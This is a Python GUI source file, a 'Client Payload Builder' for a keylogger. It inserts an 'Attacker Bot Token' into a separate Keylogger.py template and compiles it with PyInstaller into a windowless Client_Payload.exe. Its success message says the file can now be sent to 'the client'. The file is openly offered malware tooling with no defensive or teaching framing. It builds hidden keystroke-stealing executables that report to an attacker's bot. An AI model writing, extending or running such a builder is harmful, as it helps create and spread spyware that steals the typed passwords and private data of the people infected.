import tkinter as tk
from tkinter import messagebox
import os
import sys
import shutil
import threading
import subprocess

# Paths
if getattr(sys, 'frozen', False):
    BASE_DIR = os.path.dirname(sys.executable)
else:
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))

SCRIPT_PATH = os.path.join(BASE_DIR, "Keylogger.py")
TEMP_SCRIPT_NAME = "Temp_Payload.py"
TEMP_SCRIPT_PATH = os.path.join(BASE_DIR, TEMP_SCRIPT_NAME)

class ConfigBuilder:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Keylogger Configurator ⚙️")
        self.root.geometry("450x250")
        self.root.resizable(False, False)
        
        # Title
        tk.Label(self.root, text="🕵️ Client Payload Builder", font=("Segoe UI", 16, "bold")).pack(pady=15)
        
        # Token Input
        tk.Label(self.root, text="Enter Attacker Bot Token:", font=("Segoe UI", 10)).pack(anchor="w", padx=30)
        self.token_entry = tk.Entry(self.root, width=50, font=("Consolas", 9))
        self.token_entry.pack(pady=5, padx=30)
        
        # Build Button
        self.build_btn = tk.Button(self.root, text="🔨 Build Client .EXE", command=self.start_build, 
                                   bg="#D9534F", fg="white", font=("Segoe UI", 12, "bold"), height=2, width=30)
        self.build_btn.pack(pady=20)
        
        # Status
        self.status = tk.Label(self.root, text="Ready to build.", fg="gray", font=("Segoe UI", 9))
        self.status.pack(side=tk.BOTTOM, pady=10)

    def start_build(self):
        token = self.token_entry.get().strip()
        if not token:
            messagebox.showerror("Error", "Bot Token is required!")
            return
        
        # Check if Keylogger.py exists
        if not os.path.exists(SCRIPT_PATH):
             messagebox.showerror("Error", f"Keylogger.py not found!\nMake sure it is in the same folder as this Builder.\nPath: {SCRIPT_PATH}")
             return

        self.build_btn.config(state=tk.DISABLED, text="Building... ⏳")
        self.status.config(text="Injecting Token & Compiling...", fg="blue")
        
        threading.Thread(target=self.run_build_process, args=(token,), daemon=True).start()

    def run_build_process(self, token):
        try:
            # 1. Read Template
            with open(SCRIPT_PATH, "r", encoding="utf-8") as f:
                content = f.read()
            
            # 2. Inject Token
            if "TOKEN_PLACEHOLDER" not in content:
                self.fail_build("Error: Placeholder 'TOKEN_PLACEHOLDER' not found in Keylogger.py!")
                return

            new_content = content.replace("TOKEN_PLACEHOLDER", token)
            
            # 3. Save Temp Script
            with open(TEMP_SCRIPT_PATH, "w", encoding="utf-8") as f:
                f.write(new_content)
                
            # 4. Clean previous builds (DO NOT DELETE DIST, only build)
            if os.path.exists(os.path.join(BASE_DIR, "build")):
                shutil.rmtree(os.path.join(BASE_DIR, "build"))
            
            # Remove existing target file if it exists
            target_exe = os.path.join(BASE_DIR, "dist", "Client_Payload.exe")
            if os.path.exists(target_exe):
                try:
                    os.remove(target_exe)
                except:
                    pass # PyInstaller might fail later if it can't overwrite, but we tried.

            # 5. Run PyInstaller
            # Using --name "Client_Payload" to avoid conflict with "Keylogger"
            cmd = [sys.executable, "-m", "PyInstaller", "--onefile", "--noconsole", "--name", "Client_Payload", TEMP_SCRIPT_PATH]
            
            process = subprocess.Popen(cmd, cwd=BASE_DIR, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, stderr = process.communicate()
            
            # 6. Cleanup Temp Script
            if os.path.exists(TEMP_SCRIPT_PATH):
                os.remove(TEMP_SCRIPT_PATH)
                
            if process.returncode == 0:
                self.root.after(0, self.success_build)
            else:
                self.fail_build(f"PyInstaller Failed:\n{stderr}")

        except Exception as e:
            self.fail_build(f"Exception: {e}")

    def success_build(self):
        self.status.config(text="✅ Build Successful!", fg="green")
        self.build_btn.config(state=tk.NORMAL, text="🔨 Build Client .EXE")
        
        dist_path = os.path.join(BASE_DIR, "dist")
        exe_path = os.path.join(dist_path, "Client_Payload.exe")
        
        messagebox.showinfo("Success", f"Payload Generated Successfully!\n\nLocation: {exe_path}\n\nYou can now send this file to the client.")
        os.startfile(dist_path)

    def fail_build(self, error_msg):
        self.root.after(0, lambda: self._update_fail_ui(error_msg))

    def _update_fail_ui(self, error_msg):
        self.status.config(text="❌ Build Failed", fg="red")
        self.build_btn.config(state=tk.NORMAL, text="🔨 Build Client .EXE")
        print(error_msg) # Log to console
        messagebox.showerror("Build Failed", "Check console for details.\n\n" + str(error_msg)[:200])

    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    app = ConfigBuilder()
    app.run()
